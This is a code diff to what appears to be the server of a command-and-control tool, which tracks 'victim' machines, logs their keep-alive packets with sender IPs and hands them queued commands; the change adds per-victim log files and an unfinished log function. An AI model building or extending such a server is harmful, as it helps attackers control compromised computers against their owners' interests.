@@ -11,6 +11,7 @@ def prepare_environment():
 
     Path(f"{path}/Commands/").mkdir(parents=True, exist_ok=True)
     Path(f"{path}/Data/").mkdir(parents=True, exist_ok=True)
+    Path(f"{path}/Logs/").mkdir(parents=True, exist_ok=True)
 
     return Path(path)
 
@@ -18,6 +19,7 @@ def add_victim(victim_name, path):
     if(victim_name.find("/") == -1 or victim_name.find("\\") == -1):
         Path(f"{path}/Commands/{victim_name}.txt").open(mode="a").close()
         Path(f"{path}/Data/{victim_name}.txt").open(mode="a").close()
+        Path(f"{path}/Logs/{victim_name}.txt").open(mode="a").close()
 
 def get_victim_command(victim_name, path):
     file = Path(f"{path}/Commands/{victim_name}.txt").open(mode="r")
@@ -34,6 +36,10 @@ def get_victim_command(victim_name, path):
 def deserialize_json(json_object):
     message = json.loads(json_object)
     return message
+
+def log(message):
+    # to be done
+    return True
         
 def handle_load(load, path, sender_ip):
     deserialized_load = deserialize_json(load)
@@ -50,6 +56,7 @@ def handle_load(load, path, sender_ip):
 
     else:
         print(f"\n[{datetime.now().strftime('%H:%M:%S')}]keep-alive packet from {victim_name}[{sender_ip}] received")
+        log(f"\n[{datetime.now().strftime('%H:%M:%S')}]keep-alive packet from {victim_name}[{sender_ip}] received")
         command = get_victim_command(victim_name, path)
         if(command):
             print(f"sent command: {command}")
